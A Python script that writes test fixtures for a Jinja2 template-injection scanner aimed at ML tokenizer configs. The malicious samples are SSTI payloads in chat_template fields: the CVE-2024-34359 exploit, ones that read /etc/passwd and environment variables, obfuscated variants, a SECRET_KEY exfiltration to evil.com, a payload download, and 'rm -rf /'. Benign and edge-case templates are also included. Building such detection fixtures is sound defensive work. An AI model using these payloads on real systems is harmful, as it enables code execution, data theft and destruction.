#!/usr/bin/env python3
"""
Generate test assets for Jinja2 template injection scanner testing.

This script creates various test files including:
- Malicious templates with known CVE-2024-34359 payloads
- Obfuscated attack vectors
- Benign ML templates for false positive testing
- Mock GGUF files (without actual GGUF binary format)
"""
# ruff: noqa: E501  # Long lines are intentional for template strings

import json
from pathlib import Path
from typing import Any


def create_test_directories():
    """Create necessary test directories"""
    base_dir = Path(__file__).parent.parent / "samples" / "jinja2"
    base_dir.mkdir(parents=True, exist_ok=True)
    return base_dir


def generate_malicious_templates() -> dict[str, dict[str, Any]]:
    """Generate malicious template test cases"""
    return {
        # CVE-2024-34359 - Original retr0reg payload
        "cve_2024_34359_original.json": {
            "tokenizer_class": "LlamaTokenizer",
            "model_max_length": 4096,
            "chat_template": "{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__ == 'catch_warnings' %}{{ c()._module.__builtins__['__import__']('os').system('touch /tmp/retr0reg') }}{% endif %}{% endfor %}",
            "bos_token": "<s>",
            "eos_token": "</s>",
        },
        # Direct eval() attack
        "direct_eval.json": {
            "tokenizer_class": "GPT2Tokenizer",
            "chat_template": '{{ __builtins__[\'eval\'](\'__import__("subprocess").call(["echo", "pwned"])\') }}',
            "model_max_length": 1024,
        },
        # File system access via object traversal
        "file_access.json": {
            "tokenizer_class": "BertTokenizer",
            "chat_template": "{{ ''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read() }}",
            "model_max_length": 512,
        },
        # Environment variable extraction
        "env_extraction.json": {
            "tokenizer_class": "T5Tokenizer",
            "chat_template": "{{ self.__init__.__globals__['__builtins__']['__import__']('os').environ }}",
            "model_max_length": 512,
        },
        # Subprocess with shell command injection
        "subprocess_injection.json": {
            "tokenizer_class": "RobertaTokenizer",
            "chat_template": "{{ cycler.__init__.__globals__.os.popen('cat /etc/passwd').read() }}",
            "model_max_length": 1024,
        },
        # Config object exploitation
        "config_exploit.json": {
            "tokenizer_class": "XLMTokenizer",
            "chat_template": "{{ config.__class__.__base__.__subclasses__()[104].__init__.__globals__['sys'].modules['subprocess'].call(['id']) }}",
            "model_max_length": 512,
        },
        # Request object exploitation (Flask-style)
        "request_exploit.json": {
            "tokenizer_class": "DistilBertTokenizer",
            "chat_template": "{{ request.application.__globals__.__builtins__.__import__('os').popen('whoami').read() }}",
            "model_max_length": 512,
        },
        # Loop-based class discovery
        "loop_discovery.json": {
            "tokenizer_class": "AlbertTokenizer",
            "chat_template": "{% for x in ().__class__.__base__.__subclasses__() %}{% if \"warning\" in x.__name__ %}{{ x()._module.__builtins__['__import__']('os').popen(\"ls\").read() }}{% endif %}{% endfor %}",
            "model_max_length": 1024,
        },
        # Hex-encoded bypass
        "hex_bypass.json": {
            "tokenizer_class": "CamembertTokenizer",
            "chat_template": "{{ request['application']['\\x5f\\x5fglobals\\x5f\\x5f']['\\x5f\\x5fbuiltins\\x5f\\x5f']['eval']('__import__(\"os\").system(\"id\")') }}",
            "model_max_length": 512,
        },
        # Attr filter bypass
        "attr_bypass.json": {
            "tokenizer_class": "ElectraTokenizer",
            "chat_template": "{{ ''|attr('__class__')|attr('__mro__')|attr('__getitem__')(1)|attr('__subclasses__')()|attr('__getitem__')(40) }}",
            "model_max_length": 512,
        },
        # Multiple attack vectors combined
        "combined_attack.json": {
            "tokenizer_class": "DebertaTokenizer",
            "chat_template": "{% set x = cycler.__init__.__globals__ %}{{ x.os.system('echo ' + x.__builtins__.__import__('os').environ.get('USER', 'unknown')) }}",
            "model_max_length": 1024,
        },
        # Network exfiltration attempt
        "network_exfil.json": {
            "tokenizer_class": "LongformerTokenizer",
            "chat_template": "{{ joiner.__init__.__globals__.__builtins__.__import__('urllib.request').urlopen('http://evil.com/steal?data=' + config.SECRET_KEY).read() }}",
            "model_max_length": 2048,
        },
    }


def generate_obfuscated_templates() -> dict[str, dict[str, Any]]:
    """Generate obfuscated attack templates"""
    return {
        # Character construction bypass
        "char_construction.json": {
            "tokenizer_class": "GPT2Tokenizer",
            "chat_template": "{{ ().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[''.join([chr(95), chr(95), chr(98), chr(117), chr(105), chr(108), chr(116), chr(105), chr(110), chr(115), chr(95), chr(95)])] }}",
            "model_max_length": 1024,
        },
        # Base64 encoded payload
        "base64_payload.json": {
            "tokenizer_class": "BertTokenizer",
            "chat_template": "{{ __builtins__.__import__('base64').b64decode('X19pbXBvcnRfXygnb3MnKS5zeXN0ZW0oJ2VjaG8gcHduZWQnKQ==').decode() }}",
            "model_max_length": 512,
        },
        # String formatting bypass
        "format_bypass.json": {
            "tokenizer_class": "RobertaTokenizer",
            "chat_template": "{{ '{}'.format(cycler.__init__.__globals__.os.system('id')) }}",
            "model_max_length": 512,
        },
        # Getattr bypass
        "getattr_bypass.json": {
            "tokenizer_class": "T5Tokenizer",
            "chat_template": "{{ getattr(getattr(getattr('', '__class__'), '__mro__')[1], '__subclasses__')()[40]('/etc/hosts').read() }}",
            "model_max_length": 512,
        },
    }


def generate_benign_templates() -> dict[str, dict[str, Any]]:
    """Generate legitimate ML templates that should not trigger alerts"""
    return {
        # Standard HuggingFace Llama-style chat template
        "huggingface_llama.json": {
            "add_bos_token": False,
            "add_eos_token": False,
            "bos_token": {"content": "<s>"},
            "chat_template": "{% for message in messages %}{% if message['role'] == 'user' %}{{ bos_token + '[INST] ' + message['content'] + ' [/INST]' }}{% elif message['role'] == 'system' %}{{ '<<SYS>>\\n' + message['content'] + '\\n<</SYS>>\\n\\n' }}{% elif message['role'] == 'assistant' %}{{ ' ' + message['content'] + ' ' + eos_token }}{% endif %}{% endfor %}",
            "eos_token": {"content": "</s>"},
            "tokenizer_class": "LlamaTokenizer",
            "model_max_length": 4096,
        },
        # Simple role-based formatting
        "simple_roles.json": {
            "tokenizer_class": "GPT2Tokenizer",
            "chat_template": "{% for message in messages %}{{ message['role'].title() }}: {{ message['content'] }}\\n{% endfor %}",
            "model_max_length": 1024,
        },
        # Conditional system message handling
        "conditional_system.json": {
            "tokenizer_class": "T5Tokenizer",
            "chat_template": "{% if messages[0]['role'] == 'system' %}{{ messages[0]['content'] }}\\n{% endif %}{% for message in messages[1:] %}{% if message['role'] == 'user' %}User: {{ message['content'] }}{% elif message['role'] == 'assistant' %}Assistant: {{ message['content'] }}{% endif %}{% if not loop.last %}\\n{% endif %}{% endfor %}",
            "model_max_length": 512,
        },
        # Complex but legitimate template with multiple conditionals
        "complex_legitimate.json": {
            "tokenizer_class": "BertTokenizer",
            "chat_template": "{% for message in messages %}{% if message['role'] == 'system' and loop.first %}System: {{ message['content'] }}\\n\\n{% elif message['role'] == 'user' %}Human: {{ message['content'] }}\\n\\n{% elif message['role'] == 'assistant' %}Assistant: {{ message['content'] }}{% if not loop.last %}\\n\\n{% endif %}{% endif %}{% endfor %}",
            "model_max_length": 512,
        },
        # Template with special tokens
        "special_tokens.json": {
            "tokenizer_class": "RobertaTokenizer",
            "chat_template": "{% for message in messages %}{% if message['role'] == 'user' %}{{ '<|user|>' + message['content'] + '<|end|>' }}{% elif message['role'] == 'assistant' %}{{ '<|assistant|>' + message['content'] + '<|end|>' }}{% endif %}{% endfor %}",
            "model_max_length": 1024,
        },
        # ChatML format template
        "chatml_format.json": {
            "tokenizer_class": "GPT2Tokenizer",
            "chat_template": "{% for message in messages %}<|im_start|>{{ message['role'] }}\\n{{ message['content'] }}<|im_end|>\\n{% endfor %}{% if add_generation_prompt %}<|im_start|>assistant\\n{% endif %}",
            "model_max_length": 2048,
        },
    }


def generate_edge_cases() -> dict[str, dict[str, Any]]:
    """Generate edge case templates for comprehensive testing"""
    return {
        # Empty template
        "empty_template.json": {
            "tokenizer_class": "GPT2Tokenizer",
            "chat_template": "",
            "model_max_length": 1024,
        },
        # No template field
        "no_template.json": {
            "tokenizer_class": "BertTokenizer",
            "model_max_length": 512,
        },
        # Very long template (should be skipped due to size limit)
        "oversized_template.json": {
            "tokenizer_class": "T5Tokenizer",
            "chat_template": "{% for message in messages %}" + "A" * 60000 + "{{ message['content'] }}{% endfor %}",
            "model_max_length": 512,
        },
        # Invalid JSON structure
        "malformed_template.json": {
            "tokenizer_class": "RobertaTokenizer",
            "chat_template": "{{ unclosed_bracket",
            "model_max_length": 512,
        },
        # Multiple template fields
        "multiple_templates.json": {
            "tokenizer_class": "DistilBertTokenizer",
            "chat_template": "{% for message in messages %}{{ message['role'] }}: {{ message['content'] }}\\n{% endfor %}",
            "custom_chat_template": "{{ self.__init__.__globals__['os'].system('echo evil') }}",
            "model_max_length": 512,
        },
    }


def generate_standalone_templates() -> dict[str, str]:
    """Generate standalone template files"""
    return {
        # Benign standalone template
        "benign_chat.j2": """
{% for message in messages %}
  {% if message.role == "system" %}
System: {{ message.content }}
  {% elif message.role == "user" %}
User: {{ message.content }}
  {% elif message.role == "assistant" %}
Assistant: {{ message.content }}
  {% endif %}
{% endfor %}
""".strip(),
        # Malicious standalone template
        "malicious_standalone.jinja": """
{% for message in messages %}
{{ message.role }}: {{ message.content }}
{% endfor %}

{# This template includes a malicious payload #}
{{ cycler.__init__.__globals__.os.system('whoami') }}
""".strip(),
        # Template with suspicious patterns but benign intent
        "suspicious_benign.template": """
{% for message in messages %}
  {% if message.class == "important" %}
    IMPORTANT: {{ message.content }}
  {% else %}
    {{ message.content }}
  {% endif %}
{% endfor %}
""".strip(),
    }


def generate_yaml_configs() -> dict[str, dict[str, Any]]:
    """Generate YAML configuration files with templates"""
    return {
        # Benign YAML config
        "model_config.yaml": {
            "model_name": "test-model",
            "chat_template": "{% for message in messages %}{{ message['role'] }}: {{ message['content'] }}\\n{% endfor %}",
            "parameters": {
                "max_length": 1024,
                "temperature": 0.7,
            },
        },
        # Malicious YAML config
        "malicious_config.yaml": {
            "model_name": "evil-model",
            "chat_template": "{{ config.__class__.__init__.__globals__['os'].system('rm -rf /') }}",
            "deploy_script": "{{ __import__('subprocess').call(['curl', 'http://evil.com/payload.sh']) }}",
        },
    }


def save_json_files(base_dir: Path, templates: dict[str, dict[str, Any]], subdir: str = ""):
    """Save JSON template files"""
    if subdir:
        target_dir = base_dir / subdir
        target_dir.mkdir(exist_ok=True)
    else:
        target_dir = base_dir

    for filename, content in templates.items():
        filepath = target_dir / filename
        with open(filepath, "w", encoding="utf-8") as f:
            json.dump(content, f, indent=2)
        print(f"Created: {filepath}")


def save_text_files(base_dir: Path, templates: dict[str, str], subdir: str = ""):
    """Save standalone template files"""
    if subdir:
        target_dir = base_dir / subdir
        target_dir.mkdir(exist_ok=True)
    else:
        target_dir = base_dir

    for filename, content in templates.items():
        filepath = target_dir / filename
        with open(filepath, "w", encoding="utf-8") as f:
            f.write(content)
        print(f"Created: {filepath}")


def save_yaml_files(base_dir: Path, configs: dict[str, dict[str, Any]], subdir: str = ""):
    """Save YAML configuration files"""
    try:
        import yaml
    except ImportError:
        print("PyYAML not available - skipping YAML file generation")
        return

    if subdir:
        target_dir = base_dir / subdir
        target_dir.mkdir(exist_ok=True)
    else:
        target_dir = base_dir

    for filename, content in configs.items():
        filepath = target_dir / filename
        with open(filepath, "w", encoding="utf-8") as f:
            yaml.dump(content, f, default_flow_style=False)
        print(f"Created: {filepath}")


def generate_all_assets():
    """Generate all test assets"""
    print("Generating Jinja2 template injection test assets...")

    base_dir = create_test_directories()

    # Generate malicious templates
    print("\nGenerating malicious templates...")
    malicious = generate_malicious_templates()
    save_json_files(base_dir, malicious, "malicious")

    # Generate obfuscated templates
    print("\nGenerating obfuscated templates...")
    obfuscated = generate_obfuscated_templates()
    save_json_files(base_dir, obfuscated, "obfuscated")

    # Generate benign templates
    print("\nGenerating benign templates...")
    benign = generate_benign_templates()
    save_json_files(base_dir, benign, "benign")

    # Generate edge cases
    print("\nGenerating edge case templates...")
    edge_cases = generate_edge_cases()
    save_json_files(base_dir, edge_cases, "edge_cases")

    # Generate standalone templates
    print("\nGenerating standalone template files...")
    standalone = generate_standalone_templates()
    save_text_files(base_dir, standalone, "standalone")

    # Generate YAML configs
    print("\nGenerating YAML configuration files...")
    yaml_configs = generate_yaml_configs()
    save_yaml_files(base_dir, yaml_configs, "yaml")

    print(f"\n✅ Test asset generation complete! Files created in: {base_dir}")
    print(
        f"Total files generated: {len(malicious) + len(obfuscated) + len(benign) + len(edge_cases) + len(standalone) + len(yaml_configs)}"
    )


if __name__ == "__main__":
    generate_all_assets()
